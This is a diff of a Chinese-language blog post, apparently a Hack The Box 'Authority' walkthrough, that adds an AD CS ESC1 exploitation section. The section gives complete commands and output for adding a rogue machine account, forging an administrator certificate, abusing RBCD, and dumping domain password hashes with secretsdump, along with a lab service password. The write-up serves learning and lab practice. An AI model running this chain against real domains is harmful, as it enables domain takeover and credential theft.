@@ -35,8 +35,11 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority3.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority4.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority8.png">
 <meta property="article:published_time" content="2023-12-11T05:50:55.000Z">
-<meta property="article:modified_time" content="2023-12-11T09:39:56.381Z">
+<meta property="article:modified_time" content="2023-12-11T10:02:24.681Z">
 <meta property="article:author" content="fdvoid0">
 <meta property="article:tag" content="DC">
 <meta name="twitter:card" content="summary">
@@ -282,7 +285,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2023-12-11 13:50:55 / Modified: 17:39:56" itemprop="dateCreated datePublished" datetime="2023-12-11T13:50:55+08:00">2023-12-11</time>
+      <time title="Created: 2023-12-11 13:50:55 / Modified: 18:02:24" itemprop="dateCreated datePublished" datetime="2023-12-11T13:50:55+08:00">2023-12-11</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -316,14 +319,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>3.2k</span>
+      <span>3.6k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>12 mins.</span>
+      <span>13 mins.</span>
     </span>
 </div>
 
@@ -454,7 +457,31 @@
 <li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2FidXNpbmctYWN0aXZlLWRpcmVjdG9yeS1jZXJ0aWZpY2F0ZS1zZXJ2aWNlcy1wYXJ0LW9uZS8=">Abusing Active Directory Certificate Services – Part One<i class="fa fa-external-link-alt"></i></span></li>
 <li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY3Jvd2UuY29tL2N5YmVyc2VjdXJpdHktd2F0Y2gvZXhwbG9pdGluZy1hZC1jcy1hLXF1aWNrLWxvb2stYXQtZXNjMS1lc2M4">Exploiting AD CS: A quick look at ESC1 and ESC8<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
+<p>当将ADCS配置为允许低权限用户代表任何domain对象(包括特权对象)注册和请求证书时，ESC1成为漏洞。</p>
+<p>文章中给出的示例显示了有效的设置，并且它与来自Authority的内容相匹配，除了一个区别:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority6.png"></li>
+</ul>
+<p>在本例中，可以注册此模板的是Domain Computers，而不是Domain Users。</p>
+<p>在<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIyLzEyLzE3L2h0Yi1zdXBwb3J0Lmh0bWwjY3JlYXRlLWZha2Vjb21wdXRlcg==">htb-support<i class="fa fa-external-link-alt"></i></span>中，有一个利用路径，需要一台假计算机。在这里做同样的事情，尽管在Support上是从目标上的shell完成的，在这里将展示如何使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0">Impacket<i class="fa fa-external-link-alt"></i></span>远程完成它。</p>
+<p>允许用户将计算机添加到域的设置是 ms-ds-machineaccountquota。在Authority上，可以用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9SZWNvbi9Qb3dlclZpZXcucHMx">PowerView<i class="fa fa-external-link-alt"></i></span>查询:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; upload /opt/PowerSploit/Recon/PowerView.ps1</span><br><span class="line">Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\programdata\PowerView.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Data: 1027036 bytes of 1027036 bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; Get-DomainObject -Identity <span class="string">&#x27;DC=AUTHORITY,DC=HTB&#x27;</span> | select ms-ds-machineaccountquota</span><br><span class="line"></span><br><span class="line">ms-ds-machineaccountquota</span><br><span class="line">-------------------------</span><br><span class="line">                       10</span><br></pre></td></tr></table></figure>
+
+<p>netexec也可以实现同样的效果:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌[root@kali] [/dev/pts/4]</span><br><span class="line">└[~/hackthebox/machine/authority]&gt; netexec ldap 10.10.11.222 -u svc_ldap -p <span class="string">&#x27;lDaP_1n_th3_cle4r!&#x27;</span> -M MAQ</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!</span><br><span class="line">MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota</span><br><span class="line">MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority7.png"></li>
+</ul>
+<p>现在可以使用addcomputer.py添加计算机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌[root@kali] [/dev/pts/4]</span><br><span class="line">└[~/hackthebox/machine/authority]&gt; addcomputer.py <span class="string">&#x27;authority.htb/svc_ldap:lDaP_1n_th3_cle4r!&#x27;</span> -method LDAPS -computer-name <span class="string">&#x27;EVIL01&#x27;</span> -computer-pass <span class="string">&#x27;fdvoid0&#x27;</span> -dc-ip 10.10.11.222</span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Successfully added machine account EVIL01$ with password fdvoid0.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority8.png"></li>
+</ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">addcomputer.py <span class="string">&#x27;authority.htb/svc_ldap&#x27;</span> -method LDAPS -computer-name <span class="string">&#x27;EVIL01&#x27;</span> -computer-pass <span class="string">&#x27;fdvoid0&#x27;</span> -dc-ip 10.10.11.222</span><br><span class="line"></span><br><span class="line">lDaP_1n_th3_cle4r!</span><br><span class="line"></span><br><span class="line">certipy req -username EVIL01$ -password <span class="string">&#x27;fdvoid0&#x27;</span> -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug</span><br><span class="line"></span><br><span class="line">python3 /root/PassTheCert/Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to <span class="string">&#x27;AUTHORITY$&#x27;</span> -delegate-from <span class="string">&#x27;EVIL01$&#x27;</span></span><br><span class="line"></span><br><span class="line">getST.py -spn <span class="string">&#x27;cifs/AUTHORITY.authority.htb&#x27;</span> -impersonate Administrator <span class="string">&#x27;authority.htb/EVIL01$:fdvoid0&#x27;</span></span><br><span class="line"></span><br><span class="line"> ✘ ⚡ root@kali  ~/hackthebox/machine/authority  secretsdump.py -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm</span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::</span><br><span class="line">svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::</span><br><span class="line">AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:ae69c697c3873d5ef03c24d7091e7a16:::</span><br><span class="line">EVIL01$:11602:aad3b435b51404eeaad3b435b51404ee:9d3bb2d3f1edbdff68c016035a4ba13b:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+
 
 
 
@@ -615,14 +642,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>Word count total: </span>
-    <span title="Word count total">647k</span>
+    <span title="Word count total">648k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>Reading time total &asymp;</span>
-    <span title="Reading time total">39:14</span>
+    <span title="Reading time total">39:15</span>
   </span>
 </div>
 <div class="busuanzi-count">
